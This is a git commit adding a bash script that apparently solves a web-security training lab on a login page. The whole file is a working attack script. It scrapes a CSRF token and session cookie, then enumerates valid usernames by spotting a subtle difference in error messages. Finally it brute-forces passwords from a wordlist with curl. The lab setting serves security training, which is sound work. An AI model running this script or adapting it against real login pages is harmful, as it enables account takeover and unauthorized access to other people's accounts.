4859bb607c65985b4e8ba7708fa657359b56136b
EduardoDesdes <esarriap@uni.pe>
2021-01-17 12:26:47 -0500

    auth2

---
+++ authentication-ps/enum-user2.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+URL='https://ac5f1f6e1e51c1a980554be900c700f2.web-security-academy.net/login'
+NULL='/dev/null'
+
+REQUEST1=`curl $URL -D- -s`
+CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
+COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
+
+for USER in `cat user.txt`;do
+
+	DATA='csrf='$CSRF'&username='$USER'&password=a'
+	RESULT=`curl $URL -d $DATA -b $COOKIE -s`
+    
+	if echo $RESULT | grep -F '<p class=is-warning>Invalid username or password.</p>' > $NULL
+	then
+		echo "Incorrect user: $USER"
+	else
+		echo "Valid user: $USER"
+		break
+	fi
+done
+
+for PASS in `cat password.txt`;do
+
+        DATA='csrf='$CSRF'&username='$USER'&password='$PASS
+        RESULT=`curl $URL -d $DATA -b $COOKIE -s`
+
+        if echo $RESULT | grep -o "Invalid username or password" > $NULL
+        then
+                echo "Incorrect creds: $USER:$PASS"
+        else
+                echo "Valid creds: $USER:$PASS"
+                break
+        fi
+done
